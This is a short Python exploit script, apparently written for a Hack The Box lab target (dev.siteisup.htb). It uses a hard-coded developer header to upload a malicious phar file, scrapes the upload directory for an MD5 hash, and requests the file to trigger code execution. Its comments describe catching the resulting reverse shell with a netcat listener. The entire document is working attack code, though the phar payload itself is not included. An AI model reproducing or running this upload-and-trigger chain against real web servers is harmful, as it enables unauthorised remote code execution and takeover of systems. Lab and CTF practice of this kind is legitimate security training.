# This script is used to upload phar file and trigger the file for getting a reverse shell
# Usage: Run the script and setup a netcat listenser on the port you put in phar file 
# Warning: Before run the script make sure your hostfile contain the target hostname
# I uploaded the phar file on same dir

import requests
import re

class Upload:
	def __init__(self):
		self.url = "http://dev.siteisup.htb"
		self.upload_url = "http://dev.siteisup.htb/uploads/"
		self.header = {"Special-Dev":"only4dev"}
		self.file = {"file":open('rce.phar','r')}
        # File upload
		self.Upload()

    # Upload request for file upload
	def Upload(self,timeout=5):
		value = {"check":"Check"}
		try:
			r = requests.post(url=self.url,headers=self.header,files=self.file,data=value,timeout=timeout)
		except:
			pass

	# Making a request for getting the hash
	def GetFileHash(self):
		response = requests.get(url=self.upload_url,headers=self.header)
		md5 = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])',response.text)
		return md5

    # Trigger the file 
	def GetFile(self):
		Hash = self.GetFileHash()
		url = "http://dev.siteisup.htb/uploads/"+Hash[1]+"/rce.phar"
		r = requests.get(url=url,headers=self.header)
		print(r.status_code)


file = Upload()
file.GetFile()